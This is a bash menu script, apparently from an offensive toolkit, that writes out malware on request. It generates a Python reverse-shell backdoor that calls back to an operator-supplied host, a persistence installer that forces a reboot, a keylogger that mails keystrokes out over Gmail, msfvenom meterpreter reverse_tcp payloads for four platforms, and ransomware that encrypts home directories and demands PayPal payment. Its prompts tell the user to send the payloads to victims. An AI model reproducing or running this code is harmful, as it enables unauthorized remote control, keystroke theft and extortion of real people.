clear
while :
do
echo ""
echo "Malware"
echo "--------------------------------------"
echo ""
echo "  1.- Malware (Backdoor)" 
echo "  2.- Advanced Malware (Backdoor with handler in victim system)" 
echo "  3.- Keylogger (With victim Email Address)"
echo "  4.- Metasploit Reverse Backdoor (with victim IP Address)"
echo "  5.- Python Ransomware with victim PayPal xD"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo "";
echo -n "Select an option [Malware]> "
read op2
case $op2 in
1) echo "[*] Selected: Malware (Backdoor)";
echo -n "Victim IP Address [Malware]> "
read ip098
echo -n "Path to generate the payload [Malware]> "
read pth765
echo -n "Name for the payload [Malware]> "
read name765
cp -r dep/core core
mkdir $name765
mv core $name765/core
echo "$ip098" > $name765/core/nullbyte00.dat
echo "$ip098" > $name765/nullbyte00.dat
echo "#!/usr/bin/env python
import socket
import subprocess
import sys
import time
from core import *
dfile = open('nullbyte00.dat')
dfiled = dfile.read()
HOST = dfiled
PORT = 4444
CONN_TIMEOUT = 30
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)
def client_loop(conn, dhkey):
    while True:
        results = ''

        data = crypto.decrypt(conn.recv(4096), dhkey)

        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            sys.exit(0)

        elif cmd == 'uninstall':
            conn.close()
            toolkit.uninstall(PLAT)

        elif cmd == 'killall':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'rekey':
            dhkey = crypto.diffiehellman(conn)

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action, PLAT)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(PLAT)

        elif cmd == 'pwd':
            results = toolkit.pwd(PLAT)

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results +='{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def main():
    while True:
        conn = socket.socket()

        try:

            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        dhkey = crypto.diffiehellman(conn)


        try:
            client_loop(conn, dhkey)
        except:
            pass


if __name__ == '__main__':
    main()" > $name765/$name765.py
mv $name765 $pth765
echo "[+] PAYLOAD GENERATED IN: $pth765/$name765 NOW COMPRESS IT AND SEND TO ANY SYSTEM! VICTIM IP ADDRESS WILL BE SEEN!"
exit
;;
2) echo "[*] Selected: Advanced Malware";
echo -n "Victim IP Address [Malware]> "
read ip0981
echo -n "Path to generate the payload [Malware]> "
read pth7651
echo -n "Path to generate the handler [Malware]> "
read pth7652
echo -n "Name for the payload [Malware]> "
read name7651
echo -n "Name for the handler (Put a diferent name, not the same of the payload)[Malware]> "
read name7652
mkdir $name7652
cd $name7652 
mkdir lib
cd ..
cp dep/core2/core $name7652/lib/core
cp dep/handler.py $name7652/lib/$name7652.py
echo "chmod 777 $name7652.sh
cp lib/$name7652.py /opt/linux000.py
cp -r lib/core /opt/core
chmod 777 /opt/linux000.py
chmod 777 /opt/core
echo '#!/bin/sh 
      cd /opt
      python linux000.py --port 4444
      exit' > linux000.sh
cp linux000.sh /etc/init.d/linux000.sh
rm linux000.sh
chmod 777 /etc/init.d/linux000.sh
ln -s /etc/init.d/linux000.sh /etc/rc2.d/S88linux000
echo 'rebooting system...'
reboot" > $name7652/$name7652.sh
mv $name7652 $pth7652/$name7652
mkdir $name7651
cp dep/core $name7651/core
echo "$ip0981" > $name7651/core/nullbyte00.dat
echo "$ip0981" > $name7651/nullbyte00.dat
echo "#!/usr/bin/env python
import socket
import subprocess
import sys
import time
from core import *
dfile = open('nullbyte00.dat')
dfiled = dfile.read()
HOST = dfiled
PORT = 4444
CONN_TIMEOUT = 30
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)
def client_loop(conn, dhkey):
    while True:
        results = ''

        data = crypto.decrypt(conn.recv(4096), dhkey)

        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            sys.exit(0)

        elif cmd == 'uninstall':
            conn.close()
            toolkit.uninstall(PLAT)

        elif cmd == 'killall':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'rekey':
            dhkey = crypto.diffiehellman(conn)

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action, PLAT)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(PLAT)

        elif cmd == 'pwd':
            results = toolkit.pwd(PLAT)

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results +='{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def main():
    while True:
        conn = socket.socket()

        try:

            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        dhkey = crypto.diffiehellman(conn)


        try:
            client_loop(conn, dhkey)
        except:
            pass


if __name__ == '__main__':
    main()" > $name7651/$name7651.py
mv $name7651 $pth7651
echo "[+] PAYLOAD GENERATED IN: $pth7651/$name7651 NOW COMPRESS IT AND SEND TO ANY SYSTEM!"
echo "[+] HANDLER GENERATED IN: $pth7652/$name7652 NOW COMPRESS IT AND SEND TO THE VICTIM!"
exit
;;
3) echo "";
clear
while :
do
echo ""
echo "Malware"
echo "--------------------------------------"
echo ""
echo "  1.- Mirosoft Windows (PY with BeeLogger)"
echo "  2.- GNU/Linux (PY)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [Keylogger]> "
read op355
case $op355 in
1) echo "[*] Target: Microsoft Windows System";
echo "[*] Starting BeeLogger...";
python dep/bee/bee.py
;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Path to save the payload [Keylogger]> "
read pth341
echo -n "Name for the payload [Keylogger]> "
read name341
echo -n "Victim Email Address [Keylogger]> "
read gmail098
echo -n "Any Password [Keylogger]> "
read passwd098
echo "
import pygame
import sys
import smtplib
 
FROMADDR, TOADDR   = '$gmail098', '$gmail098'
username, password = '$gmail098', '$passwd098'
 
 
red = (255, 0, 0)
x_val = 0
key_list = []
replacements = {
    13: '\n',
    32: ' ',
}
 
pygame.init()
 
font = pygame.font.SysFont('comicsansms', 48)
text = font.render('Loading', 1, red, None)
screen = pygame.display.set_mode((800, 600))
 
 
clock = pygame.time.Clock()
 
running = True
 
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.KEYUP:
            default = pygame.key.name(event.key)
            key_list.append(replacements.get(event.key,default))
 
    clock.tick(60)
 
    pygame.draw.rect(screen, red, (0, 550, x_val, 20))
    x_val += 0.1
    screen.blit(text, (325, 100))
    #print(key_string)
    pygame.display.flip()
 
# The actual mail send
server = smtplib.SMTP('smtp.gmail.com:587')
server.starttls()
server.login(username,password)
server.sendmail(FROMADDR, TOADDR, ''.join(key_list))
server.quit()
sys.exit()" > $pth341/$name341.py
cd $pth341
echo "[+] GENERATED IN: $pth341/$name341.py ... NOW SEND TO A SYSTEM!!"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op355 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done
;;
4) echo "[*] Selected: Metasploit reverse Backdoor";
clear
while :
do
echo ""
echo "Metasploit Reverse Backdoor"
echo "--------------------------------------"
echo ""
echo "  1.- Microsoft Windows (EXE)"
echo "  2.- Linux (Python)"
echo "  3.- Android (APK)"
echo "  4.- HTTP Server (PHP)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo -n "Select an option [MsfBackdoor]> "
read op22
case $op22 in
1) echo "[*] Target: Microsoft Windows System";
echo -n "Port [MsfBackdoor]> "
read port11
echo -n "Victim IP Address [MsfBackdoor]> "
read ip11
echo -n "Complete path to save payload (Putting 'exe' Extension)[MsfBackdoor]> "
read path11
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip11 LPORT=$port11 -f exe > $path11
echo "[+] PAYLOAD CREATED NOW SEND IT TO SOMEONE AND VICTIM IP ADDRESS WILL BE SEEN!"
exit;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Port [MsfBackdoor]> "
read port12
echo -n "Victim IP Address [MsfBackdoor]> "
read ip12
echo -n "Complete path to save payload (Putting 'py' Extension) [MsfBackdoor]> "
read path12
msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip12 LPORT=$port12 > $path12
echo "[+] PAYLOAD CREATED NOW SEND IT TO SOMEONE AND VICTIM IP ADDRESS WILL BE SEEN!"
exit;;
3) echo "[*] Target: Android System";
echo -n "Port [MsfBackdoor]> "
read port13
echo -n "Victim IP Address [MsfBackdoor]> "
read ip13
echo -n "Complete path to save payload (Putting 'apk' Extension)[MsfBackdoor]> "
read path13
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip13 LPORT=$port13 -f apk R > $path13
echo "[+] PAYLOAD CREATED NOW SEND IT TO SOMEONE AND VICTIM IP ADDRESS WILL BE SEEN!"
exit;;
4) echo "[*] Target: HTTP Server";
echo -n "Port [MsfBackdoor]> "
read port14
echo -n "Victim IP Address [MsfBackdoor]> "
read ip14
echo -n "Complete path to save payload (Putting 'php' Extension)[MsfBackdoor]> "
read path14
msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip14 LPORT=$port14 > $path14
echo "[+] PAYLOAD CREATED NOW SEND IT TO SOMEONE AND VICTIM IP ADDRESS WILL BE SEEN!"
exit;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op22 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done;;
5) echo "[*] Selected: Python Ransomware";
clear
while :
do
echo "Malware"
echo "--------------------------------------"
echo ""
echo "  1.- Microsoft Windows"
echo "  2.- Linux"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select [PythonRansomware]> "
read pyransom
case $pyransom in
1) echo "[*] Selected: Microsoft Windows";
echo -n "Victim Paypal [PythonRansomware]> "
read paypal1
echo -n "Path to generate the Payload [PythonRansomware]> "
read pth7681
echo -n "Name for the Payload [PythonRansomware]> "
read name00041
echo "import os
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

path = [ os.getenv('HOMEPATH') + '\'] 

def notification():
    note = 'ENGLISH: Hi, all your files have been encrypted!!! Please to recover them you must pay 100 USD to this Paypal: $paypal1'
    desktop_dir = os.getenv('HOMEPATH') + '\Desktop' 
    outputfile = desktop_dir + 'README_IMPORTANT_VERY_IMPORTANT.txt'
    handler = open(outputfile,'w')
    handler.write(note)
    handler.close()

def encrypt_file(password,filename):

    chunksize = 65536

    direx, ext = os.path.splitext(filename)
    ext += ' ' * (16 - (len(ext) % 16))

    enc_outputfile = direx + '.ransom'
    file_size = str(os.path.getsize(filename)).zfill(16)
    init_vector = ''

    for i in range(16):
        init_vector += chr(randint(0, 255))

    encryptor = AES.new(password,AES.MODE_CBC, init_vector)
    with open(filename, 'rb') as file_handler:
        with open(enc_outputfile, 'wb') as outputfile_handler:
            outputfile_handler.write(ext)
            outputfile_handler.write(file_size)
            outputfile_handler.write(init_vector)
            while True:
                chunk_read = file_handler.read(chunksize)
                if len(chunk_read) == 0:
                    break
                elif len(chunk_read) % 16 != 0:
                    chunk_read += ' ' * (16 - (len(chunk_read) % 16))
                outputfile_handler.write(encryptor.encrypt(chunk_read))

    os.unlink(filename) 


notification()
for paths in path:
    for root, dirs, files in os.walk(paths):
        for names in files:
            print names+'\r'
            print root+'\r'
            encrypt_file(SHA256.new('this_is_the_seed').digest(),str(os.path.join(root,names)))



" > $pth7681/$name00041.py
echo "[+] GENERATED IN: $pth7681/$name00041.py NOW SEND TO ANY SYSTEM! VICTIM PAYPAL WILL BE SEEN!"
exit;;
2) echo "[*] Selected: Linux";
echo -n "Victim Paypal [PythonRansomware]> "
read paypal2
echo -n "Path to generate the Payload [PythonRansomware]> "
read pth768
echo -n "Name for the Payload [PythonRansomware]> "
read name0004
mkdir $pth768/$name0004
mkdir $pth768/$name0004/setup
echo "import os
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

path = [ os.getenv('HOME') + '/'] 

def notification():
    note = 'ENGLISH: Hi, all your files have been encrypted!!! Please to recover them you must pay 100 USD to this Paypal: $paypal2'
    desktop_dir = os.getenv('HOME') + '/Desktop' 
    outputfile = desktop_dir + 'README_IMPORTANT_VERY_IMPORTANT.txt'
    handler = open(outputfile,'w')
    handler.write(note)
    handler.close()

def encrypt_file(password,filename):

    chunksize = 65536

    direx, ext = os.path.splitext(filename)
    ext += ' ' * (16 - (len(ext) % 16))

    enc_outputfile = direx + '.ransom'
    file_size = str(os.path.getsize(filename)).zfill(16)
    init_vector = ''

    for i in range(16):
        init_vector += chr(randint(0, 255))

    encryptor = AES.new(password,AES.MODE_CBC, init_vector)
    with open(filename, 'rb') as file_handler:
        with open(enc_outputfile, 'wb') as outputfile_handler:
            outputfile_handler.write(ext)
            outputfile_handler.write(file_size)
            outputfile_handler.write(init_vector)
            while True:
                chunk_read = file_handler.read(chunksize)
                if len(chunk_read) == 0:
                    break
                elif len(chunk_read) % 16 != 0:
                    chunk_read += ' ' * (16 - (len(chunk_read) % 16))
                outputfile_handler.write(encryptor.encrypt(chunk_read))

    os.unlink(filename) 


notification()
for paths in path:
    for root, dirs, files in os.walk(paths):
        for names in files:
            print names+'\r'
            print root+'\r'
            encrypt_file(SHA256.new('this_is_the_seed').digest(),str(os.path.join(root,names)))



" > $pth768/$name0004/setup/$name0004.py
echo "#!/bin/bash
chmod 777 setup.sh
chmod 777 setup/$name0004.py 
apt-get install python-pip
apt-get install pip
apt-get install python-pip
apt-get install pip
pip install pycrypto
python setup/$name0004.py" > $pth768/$name0004/setup.sh
echo "[+] GENERATED IN: $pth768/$name0004 NOW COMPRESS IT AND SEND TO ANY SYSTEM! VICTIM PAYPAL WILL BE SEEN!"
exit;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $pyransom is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op2 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done
